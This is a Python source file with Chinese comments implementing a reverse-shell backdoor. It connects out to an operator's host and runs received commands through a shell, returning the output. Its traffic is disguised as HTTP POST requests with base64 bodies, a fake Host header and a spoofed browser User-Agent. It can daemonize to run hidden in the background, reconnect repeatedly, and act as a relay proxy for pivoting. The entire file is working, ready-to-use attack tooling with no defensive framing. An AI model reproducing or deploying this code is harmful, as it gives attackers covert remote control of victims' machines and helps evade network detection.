# -*- coding: utf-8 -*-
import argparse
import atexit
import base64
import os
import socket
import subprocess
import sys
import time


# 进行连接
def connection(host, port):
    global cwd
    cwd = '/'
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        print(host, port)
        s.connect((host, int(port)))
        print("已连接。。。。")
        while True:
            data = s.recv(8192)
            # 判断是否作为代理
            global proxy_listen
            if proxy_listen:
                data = proxy(data)
                s.send(data)
                data = decryption_res(data).decode()
                if data == '\\!shutdown':
                    print('接收到终止进程的指令')
                    sys.exit(0)
                continue

            try:
                data = decryption_res(data).decode()
                if data == '\\!shutdown':
                    print('接收到终止进程的指令')
                    sys.exit(0)
                tmp_cmd = data
                if tmp_cmd.startswith('cd '):
                    cwd = tmp_cmd[3:]
                elif tmp_cmd.strip() == 'c:' or tmp_cmd.strip() == 'd:' or tmp_cmd.strip() == 'e:' or tmp_cmd.strip() == 'f:' or tmp_cmd.strip() == 'g:' or tmp_cmd.strip() == 'h:':
                    cwd = tmp_cmd[:2]
                # print("切换至目录：%s" % cwd)
                comRst = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, cwd=cwd, stderr=subprocess.PIPE,
                                          stdin=subprocess.PIPE)
                out, err = comRst.communicate()

                result = ''
                if comRst.returncode:
                    result = '--error:%s' % tmp_cmd
                else:
                    for line in out.splitlines():
                        try:
                            line = line.decode('utf-8', 'ignore')
                        except:
                            line = "'utf-8' codec can't decode byte"
                        result += "%s\r\n" % line
                s.send(encryption_req(result.encode()))
            except Exception as e:
                print(e)
                s.send(encryption_req(str(e).encode()))
            time.sleep(1)
        s.close()
    except Exception as e:
        print(e)


# 守护进程
def daemonize(pid_file=None, **kwargs):
    pid = os.fork()
    if pid:
        sys.exit(0)
    os.chdir('/')
    os.umask(0)
    os.setsid()

    _pid = os.fork()
    if _pid:
        sys.exit(0)

    sys.stdout.flush()
    sys.stderr.flush()
    with open('/dev/null') as read_null, open('/dev/null', 'w') as write_null:
        os.dup2(read_null.fileno(), sys.stdin.fileno())
        os.dup2(write_null.fileno(), sys.stdout.fileno())
        os.dup2(write_null.fileno(), sys.stderr.fileno())
    if pid_file:
        with open(pid_file, 'w+') as f:
            f.write(str(os.getpid()))
    atexit.register(os.remove, pid_file)

    connection(kwargs.get('host'), kwargs.get('port'))


# 加密
def encryption_req(data):
    # 可以采用任何加密或编码方式
    data = base64.b64encode(data).decode()

    sendData = "POST /pushdata"
    sendData += "\r\n"
    sendData += "HTTP/1.1"
    sendData += "\r\n"
    sendData += "Host: tazxuo.com"
    sendData += "\r\n"
    sendData += "Connection: close"
    sendData += "\r\n"
    sendData += "Upgrade-Insecure-Requests: 1"
    sendData += "\r\n"
    sendData += "User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/32.13 (KHTML, like Gecko) Chrome/59.0.332.13 Safari/452.36"
    sendData += "\r\n"
    sendData += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"
    sendData += "\r\n"
    sendData += "Accept-Language: en-US,en;q=0.9"
    sendData += "\r\n"
    sendData += "Accept-Encoding: gzip, deflate"
    sendData += "\r\n"
    sendData += "\r\n"
    sendData += "stri0date=%s" % data
    sendData += "\r\n"
    sendData += "\r\n"
    return sendData.encode()


# 解密
def decryption_res(data):
    data = data.decode()
    data = data[data.find("Connection: keep-alive\r\n\r\n") + 26:]
    data = str(base64.b64decode(data), "utf-8")
    return data.encode()

# 中间人代理
def proxy(data):
    global proxy_ss
    proxy_ss.send(data)
    rst = proxy_ss.recv(8192)
    return rst

if __name__ == '__main__':
    # 命令行参数解析对象
    parser = argparse.ArgumentParser()
    parser.add_argument('-host', dest='hostName', help='Server Host Name')
    parser.add_argument('-port', dest='conPort', help='Server Host Port')
    parser.add_argument('-always', dest='always', type=int, nargs='?', default=False, help='Set the reconnection interval (s).)')
    parser.add_argument('-proxyd', dest='proxyd', help='Acting as proxy. eg.:-proxyd 0:8888')
    parser.add_argument('--daemon', nargs='?', default=False, help='Daemon Start')

    # 解析命令行参数
    args = parser.parse_args()
    host = args.hostName
    port = args.conPort
    always = args.always
    proxyd = args.proxyd
    daemon = args.daemon

    if host == None or port == None:
        print('Required parameters: -host, -port.')
        print('必须参数：-host、-port。')
        print(parser.parse_args(['-h']))
        exit(0)

    # 定义连接次数
    global conntimes
    conntimes = 0

    # 定义代理模式
    global proxy_listen
    proxy_listen = proxyd
    if proxy_listen:
        listen_host = proxy_listen.split(':')[0]
        listen_port = int(proxy_listen.split(':')[1])
        proxy_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        proxy_s.bind((listen_host, listen_port))
        proxy_s.listen(512)
        print("开启代理模式：ip,端口:", listen_host, listen_port)
        global proxy_ss
        proxy_ss, addr = proxy_s.accept()
        print('代理连接人：', str(addr[0]))


    while True:
        conntimes += 1
        if daemon != False:
            # 守护进程启动
            import platform
            import re

            if re.search('Windows', platform.system(), re.IGNORECASE):
                if conntimes == 1:
                    print('Windows system does not support daemon startup for the time being, and has switched to non-daemon mode.')
                    print('Windows系统暂不支持守护进程启动，已切换为非守护进程方式。')
                connection(host, port)
            else:
                daemonize(host=host, port=port)
        else:
            connection(host, port)

        if always != False and always > 0:
            if always is None:
                always = 10
            print("%d秒后尝试重新连接(%d)..." % (always, conntimes))
            time.sleep(always)
        else:
            break